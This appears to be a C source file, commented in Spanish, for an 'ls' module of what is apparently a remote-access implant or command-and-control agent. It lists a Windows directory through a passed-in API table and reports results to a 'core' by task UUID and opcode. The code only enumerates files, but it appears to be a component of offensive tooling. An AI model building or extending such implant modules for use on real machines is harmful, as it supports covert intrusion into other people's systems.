/*
 * ls -> lista los archivos del directorio actual
 * 65 -> 0x41
 */

#include <stdint.h>
#include "api_table.h"
#include "parser.h"
#include "module_helpers.h"

/* OUT_BUF_SIZE -> En el peor caso cada archivo son ~290 bytes de linea.
   64KB aguanta ~200-500 archivos y trunca silenciosamente al llenarse. */


/* ── Entry point ── */
void go(ApiTable* api, const char* task_uuid, Param* params, uint32_t param_count) {
    wchar_t pattern[PATTERN_LEN];
    wzero(pattern, PATTERN_LEN);

    // 1. Parsear Path "ls C:\foo" → params[0] (UTF-8) → wide
    if (param_count >= 1 && params[0].size > 0 && params[0].size < 512) { //MAX_PATH de Windows es 260 caracteres se da 512 como precaucion
        int n = api->MultiByteToWideChar(CP_UTF8, 0,
                                         (const char*)params[0].data,
                                         (int)params[0].size,
                                         pattern, PATTERN_LEN - 8);
        if (n > 0) pattern[n] = L'\0';
    } else { // si no → directorio actual ls /*
        api->GetCurrentDirectoryW(PATTERN_LEN - 8, pattern); // -8 simplmente para margen, sobrarian 6 bytes
    }

    //"C:\foo" → "C:\foo\*"
    size_t plen = wlen(pattern);

    /* Guardar el directorio (sin wildcard) como primera linea del output */
    char dir_utf8[1024];
    api->WideCharToMultiByte(CP_UTF8, 0, pattern, -1,
                             dir_utf8, sizeof(dir_utf8), NULL, NULL);

    if (plen > 0 && pattern[plen - 1] != L'\\')
        wcat(pattern, L"\\");
    wcat(pattern, L"*");

    /* 2. Buffer de salida */
    char* out = (char*)api->malloc(OUT_BUF_SIZE);
    if (!out) return;
    size_t used = 0;

    /* Cabecera: directorio listado */
    buf_append_str(out, &used, dir_utf8);
    buf_append_str(out, &used, ":\n");

    /* 3. Enumeracion */
    WIN32_FIND_DATAW fd;
    HANDLE h = api->FindFirstFileW(pattern, &fd);

    if (h == INVALID_HANDLE_VALUE) {
        buf_append_str(out, &used, "ls: no se pudo abrir el directorio\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    char name_utf8[1024];
    char size_str[24];

    do {
        /* Saltar "." y ".." */
        if (fd.cFileName[0] == L'.' && fd.cFileName[1] == L'\0') continue;
        if (fd.cFileName[0] == L'.' && fd.cFileName[1] == L'.' && fd.cFileName[2] == L'\0') continue;

        /* wide → UTF-8 */
        api->WideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1,
                                 name_utf8, sizeof(name_utf8), NULL, NULL);

        /* Tamaño Windows no da el tamaño en un uint64_t, lo parte en dos DWORD */
        uint64_t fsize = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        u64_to_dec(fsize, size_str);

        /* Linea: nombre \t tamaño \t DIR|FILE \n */
        buf_append_str(out, &used, name_utf8);
        buf_append_str(out, &used, "\t");
        buf_append_str(out, &used, size_str);
        buf_append_str(out, &used,
            (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "\tDIR\n" : "\tFILE\n");

        /*Posible informacion adicional:
         * ftCreationTime, ftLastAccessTime, ftLastWriteTime
         * dwFileAttributes
         */

    } while (api->FindNextFileW(h, &fd));

    api->FindClose(h);

    /* 4. Reportar al core */
    api->report_result(task_uuid, (const uint8_t*)out, used, 0x95);
    api->free(out);
}